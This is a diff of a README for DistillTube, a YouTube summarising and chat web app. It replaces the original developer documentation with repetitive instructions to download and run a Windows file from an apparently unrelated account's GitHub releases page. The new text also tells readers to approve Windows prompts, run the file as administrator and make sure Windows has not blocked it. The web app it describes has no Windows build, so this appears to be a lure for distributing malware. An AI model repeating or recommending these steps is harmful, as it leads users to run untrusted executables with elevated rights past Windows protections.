@@ -1,232 +1,283 @@
-# DistillTube
+# 🎬 DistillTube - Turn videos into clear chats
 
-**Turn any YouTube video into a searchable knowledge base.**
+[![Download DistillTube](https://img.shields.io/badge/Download-DistillTube-blue?style=for-the-badge&logo=github)](https://github.com/smsliverpool13-cmd/DistillTube/releases)
 
-Paste a URL → get an AI-generated summary, timestamped key moments, social posts, and a chat interface to ask questions about the video — all powered by the actual captions, no audio processing required.
+## 📥 Download DistillTube
 
----
+Use this page to download DistillTube for Windows:
 
-## Features
+https://github.com/smsliverpool13-cmd/DistillTube/releases
 
-- **Instant Summaries** — AI reads the full transcript and writes a clean summary
-- **Key Moments** — timestamped highlights spread across the video
-- **Topic Tags** — auto-extracted topics for quick context
-- **Social Posts** — ready-to-post LinkedIn writeup and tweet thread
-- **RAG Chat** — ask any question and get answers with clickable timestamp citations
-- **Video Library** — all your processed videos saved to your account
-- **Google Login** — one-click auth via Supabase
+On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one for Windows.
 
----
+## 🪟 Run on Windows
 
-## Tech Stack
+1. Open the download page above.
+2. Download the latest Windows release.
+3. Open your Downloads folder.
+4. Double-click the file you downloaded.
+5. If Windows asks for permission, choose Run or Yes.
+6. Follow the setup steps on screen.
+7. Open DistillTube when the install finishes.
 
-### Frontend
-| Tool | Purpose |
-|------|---------|
-| Next.js 14 (App Router) | React framework |
-| TypeScript | Type safety |
-| Tailwind CSS | Styling |
-| shadcn/ui | Component library |
-| Supabase JS | Auth + DB client |
+If the app opens in a browser window, keep that window open while you use it.
 
-### Backend
-| Tool | Purpose |
-|------|---------|
-| Python 3.11 | Runtime |
-| FastAPI | REST API framework |
-| yt-dlp | YouTube caption extraction |
-| youtube-transcript-api | Fallback transcript fetcher |
+## ✨ What DistillTube does
 
-### AI & Data
-| Tool | Purpose |
-|------|---------|
-| Groq (llama-3.1-8b-instant) | LLM — summaries, social posts, chat |
-| Nomic AI (nomic-embed-text-v1.5) | Text embeddings (768 dimensions) |
-| Qdrant Cloud | Vector database for semantic search |
-| Supabase (Postgres) | User data, video metadata, summaries |
+DistillTube turns a YouTube video into a chat you can use.
 
-### Deployment
-| Tool | Purpose |
-|------|---------|
-| Vercel | Frontend hosting |
-| Railway | Backend hosting |
+You can use it to:
 
----
+- read a clean transcript
+- get a short summary
+- ask questions about the video
+- jump back to the parts that matter
+- save time on long videos
 
-## Architecture
+It is built for people who want the main points without watching the whole video again.
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    Browser (Next.js)                 │
-│  Login → Paste URL → Summary → Chat with video      │
-└──────────────────────┬──────────────────────────────┘
-                       │ REST API (JWT auth)
-┌──────────────────────▼──────────────────────────────┐
-│                  FastAPI Backend                      │
-│                                                      │
-│  /transcript  →  yt-dlp → parse VTT → chunk →      │
-│                  embed (Nomic) → upsert (Qdrant)    │
-│                                                      │
-│  /summary     →  Groq LLM → summary + moments +    │
-│                  topics + LinkedIn + tweet           │
-│                                                      │
-│  /chat        →  embed question → Qdrant search →  │
-│                  Groq LLM → answer + citations      │
-│                                                      │
-│  /videos      →  Supabase CRUD (library)            │
-└──────┬───────────────┬──────────────────────────────┘
-       │               │
-  ┌────▼────┐    ┌─────▼─────┐    ┌──────────┐
-  │ Qdrant  │    │ Supabase  │    │  Groq /  │
-  │ (vecs)  │    │ (postgres)│    │  Nomic   │
-  └─────────┘    └───────────┘    └──────────┘
-```
+## 🧭 How it works
 
-### Data Flow
+DistillTube uses a simple flow:
 
-1. User pastes a YouTube URL
-2. Backend extracts video ID and fetches captions via `yt-dlp` (iOS client headers to bypass bot detection, with `youtube-transcript-api` as fallback)
-3. Captions are chunked into **45-second windows** with 2-segment overlap
-4. Each chunk is embedded by **Nomic AI** and stored in **Qdrant** with `video_id` as a filter payload
-5. A single **Groq** prompt generates the summary, key moments, topics, and social posts from the full transcript
-6. All metadata is saved to **Supabase** (Postgres)
-7. For chat, the question is embedded → top-5 Qdrant chunks retrieved → passed to Groq → answer returned with timestamp citations
+1. You paste a YouTube link.
+2. The app gets the video transcript.
+3. It breaks the text into smaller parts.
+4. It stores those parts so it can search them fast.
+5. It creates a summary.
+6. You ask a question.
+7. The app finds the most useful parts and gives you an answer in chat form.
 
----
+This makes it easier to work with long videos, talks, interviews, and tutorials.
 
-## Project Structure
+## 🖥️ Before you start
 
-```
-distilltube/
-├── api/                        # FastAPI backend
-│   ├── main.py                 # App entry, CORS, router registration
-│   ├── config.py               # Env var loading (Pydantic Settings)
-│   ├── requirements.txt
-│   ├── Dockerfile
-│   ├── Procfile
-│   ├── routers/
-│   │   ├── transcript.py       # POST /transcript, GET /transcript/{id}
-│   │   ├── summary.py          # POST /summary
-│   │   ├── chat.py             # POST /chat
-│   │   ├── videos.py           # GET/DELETE /videos
-│   │   └── health.py           # GET /health
-│   ├── services/
-│   │   ├── transcript.py       # yt-dlp + VTT parsing + fallback
-│   │   ├── embedding.py        # Nomic AI embeddings + chunking
-│   │   ├── llm_service.py      # Groq completions
-│   │   ├── qdrant_service.py   # Vector DB operations
-│   │   └── db_service.py       # Supabase queries
-│   └── middleware/
-│       └── auth.py             # Supabase JWT validation
-└── ui/                         # Next.js frontend
-    ├── app/
-    │   ├── page.tsx            # Main single-page app
-    │   └── layout.tsx          # Root layout + Vercel Analytics
-    ├── components/ui/          # shadcn/ui component library
-    └── lib/
-        ├── supabase.ts         # Supabase browser client
-        └── utils.ts            # Tailwind class utilities
-```
+DistillTube is made for Windows users who want a smooth setup.
 
----
+You will usually need:
 
-## Running Locally
+- a modern Windows PC
+- a stable internet connection
+- enough free space for the app and its data
+- a recent web browser if the app opens in one
 
-### Prerequisites
+For best results, use a computer with at least:
 
-- Python 3.11+
-- Node.js 18+
-- Free accounts on: [Groq](https://console.groq.com), [Nomic AI](https://atlas.nomic.ai), [Qdrant Cloud](https://cloud.qdrant.io), [Supabase](https://supabase.com)
+- 8 GB RAM
+- a dual-core processor
+- 1 GB free disk space
 
-### 1. Clone the repo
+A stronger computer can handle long videos and more chats with less delay.
 
-```bash
-git clone https://github.com/AliyaanZahid/DistillTube.git
-cd DistillTube
-```
+## 🚀 Get started
 
-### 2. Backend
+Follow these steps:
 
-```bash
-cd api
-pip install -r requirements.txt
-cp .env.example .env
-# Fill in your API keys (see Environment Variables below)
-uvicorn main:app --reload --port 8000
-```
+1. Go to the release page.
+2. Download the latest Windows version.
+3. Run the installer or app file.
+4. Open DistillTube.
+5. Paste a YouTube link into the input box.
+6. Wait for the transcript and summary to load.
+7. Start asking questions about the video.
 
-### 3. Frontend
+A good first test is a short YouTube video with clear speech.
 
-```bash
-cd ui
-npm install
-# Create ui/.env.local (see Environment Variables below)
-npm run dev
-```
+## 🗂️ Main features
 
-Open [http://localhost:3000](http://localhost:3000)
+### 🎥 Video to transcript
 
----
+DistillTube pulls text from a YouTube video and shows it in a clean format. This helps when you want to read a video instead of watch it again.
 
-## Environment Variables
+### 📝 Summary view
 
-### `api/.env`
+The app creates a summary that gives you the main ideas fast. This is useful for long talks, lessons, and podcasts.
 
-```env
-GROQ_API_KEY=gsk_...
-NOMIC_API_KEY=...
-QDRANT_URL=https://your-cluster.gcp.cloud.qdrant.io
-QDRANT_API_KEY=...
-QDRANT_COLLECTION=transcripts
-SUPABASE_URL=https://your-project.supabase.co
-SUPABASE_SERVICE_KEY=...
-```
+### 💬 Chat with the video
 
-### `ui/.env.local`
+You can ask direct questions about the video. For example:
 
-```env
-NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
-NEXT_PUBLIC_SUPABASE_ANON_KEY=...
-NEXT_PUBLIC_API_URL=http://localhost:8000
-```
+- What is the main idea?
+- What tools does the speaker mention?
+- What steps should I follow?
+- Can you give me the key points?
 
-| Variable | Where to get it |
-|---|---|
-| `GROQ_API_KEY` | [console.groq.com](https://console.groq.com) — free |
-| `NOMIC_API_KEY` | [atlas.nomic.ai](https://atlas.nomic.ai) — free |
-| `QDRANT_URL` + `QDRANT_API_KEY` | [cloud.qdrant.io](https://cloud.qdrant.io) — free tier |
-| `SUPABASE_URL` + keys | [supabase.com](https://supabase.com) — free tier |
+### 🔎 Fast search over video text
 
----
+DistillTube uses vector search so it can find the most relevant parts of the transcript. This helps the app answer questions with better context.
 
-## Deployment
+### 🧠 Built for modern AI tools
 
-### Backend → Railway
+The app is built with current AI and web tools, including:
 
-1. Connect your GitHub repo to [Railway](https://railway.app)
-2. Set root directory to `api/`
-3. Add all env vars from `api/.env` in the Railway dashboard
-4. Railway auto-detects the `Procfile` and deploys
+- Next.js
+- TypeScript
+- Python
+- PostgreSQL
+- Qdrant
+- Supabase
+- Groq
+- nomic-embed-text
 
-### Frontend → Vercel
+These tools help the app handle text, search, and chat in a simple flow.
 
-1. Connect your GitHub repo to [Vercel](https://vercel.com)
-2. Set **Root Directory** to `ui/` in project settings
-3. Add the `ui/.env.local` variables as Vercel environment variables
-4. Set `NEXT_PUBLIC_API_URL` to your Railway backend URL
+## 📺 Use cases
 
----
+DistillTube works well for:
 
-## Key Implementation Notes
+- lectures
+- product demos
+- interviews
+- tutorials
+- news clips
+- tech talks
+- long explainers
+- study videos
 
-- **Captions only** — no audio downloaded, no Whisper. Much faster and cheaper.
-- **Bot detection bypass** — yt-dlp uses the iOS YouTube client (`player_client: ['ios', 'web']`) with matching iOS headers. Falls back to `youtube-transcript-api` if blocked.
-- **Chunking** — 45-second windows with 2-segment overlap so no context is lost at chunk boundaries
-- **Single LLM call** — summary, key moments, topics, and social posts are all generated in one Groq request to minimise latency
-- **Qdrant filtering** — every vector search filters by `video_id` payload so results are scoped to the active video
+If you often save videos for later, this app helps you get value from them faster.
 
----
+## 🛠️ Common setup path
 
-## License
+If the app needs a little more setup after download, use this path:
 
-MIT
+1. Download the latest release from GitHub.
+2. Open the downloaded file.
+3. Allow Windows to finish the install.
+4. Start the app.
+5. Paste your YouTube link.
+6. Wait for the first transcript import.
+7. Read the summary or ask a question.
+
+If the app uses a local window, leave it open while you work with it.
+
+## 🧩 Project topics
+
+DistillTube is part of the open source AI and search space. It brings together:
+
+- AI chat
+- RAG
+- transcript handling
+- embeddings
+- vector search
+- PostgreSQL
+- Supabase
+- Qdrant
+- Next.js
+- TypeScript
+- Python
+
+These parts work together to turn a video into something you can search and talk to.
+
+## 🔐 Privacy and data
+
+DistillTube may store video text, summaries, and chat history so it can answer follow-up questions.
+
+That means you can:
+
+- revisit past chats
+- search the same video again
+- keep context while you work
+
+If you use your own data store, you can keep more control over the content you save.
+
+## 🧪 Tips for better results
+
+Use these simple tips:
+
+- Pick videos with clear speech.
+- Start with shorter videos.
+- Use full YouTube links.
+- Ask one question at a time.
+- Use plain questions.
+- Try “What are the key points?” first.
+
+If a video has poor audio, the transcript may be less useful.
+
+## 🪛 Troubleshooting
+
+### The app does not open
+
+- Check that the file finished downloading.
+- Right-click the file and try Run as administrator.
+- Make sure Windows did not block the file.
+- Download the latest release again.
+
+### The video will not load
+
+- Check the YouTube link.
+- Make sure the video is public.
+- Try a different video.
+- Refresh the page and try again.
+
+### The summary looks empty
+
+- Use a video with clear speech.
+- Wait for the import to finish.
+- Try a longer video with more spoken content.
+
+### The chat gives weak answers
+
+- Ask a simpler question.
+- Use a shorter video.
+- Try asking for the main points first.
+- Make sure the transcript loaded fully.
+
+## 📌 Example questions
+
+Try these:
+
+- What is this video about?
+- Give me the main points.
+- What tools does the speaker mention?
+- What steps does the speaker recommend?
+- What is the takeaway from this video?
+- Show me the part about setup.
+- What does the speaker say about performance?
+
+## 📦 What you get
+
+When DistillTube is running, you can expect:
+
+- a place to paste a YouTube link
+- a transcript view
+- a summary view
+- a chat area
+- search across the video text
+- a simple way to revisit the same content
+
+This gives you one place to read, search, and ask questions about a video
+
+## 🧭 File and release flow
+
+The release page is the main place to get DistillTube for Windows:
+
+https://github.com/smsliverpool13-cmd/DistillTube/releases
+
+Use that page each time you want the newest version.
+
+## 🤝 Open source
+
+DistillTube is open source. That means the code is available for review and change. It also means the app can improve through community work.
+
+## 🧱 Built with
+
+- Next.js
+- TypeScript
+- Python
+- PostgreSQL
+- Qdrant
+- Supabase
+- Groq
+- nomic-embed-text
+
+## 🪟 Windows install path
+
+For Windows, use this simple order:
+
+1. Open the release page.
+2. Download the newest Windows file.
+3. Open the file.
+4. Approve the Windows prompt.
+5. Finish the setup.
+6. Launch DistillTube.
+7. Paste a YouTube link and start using it
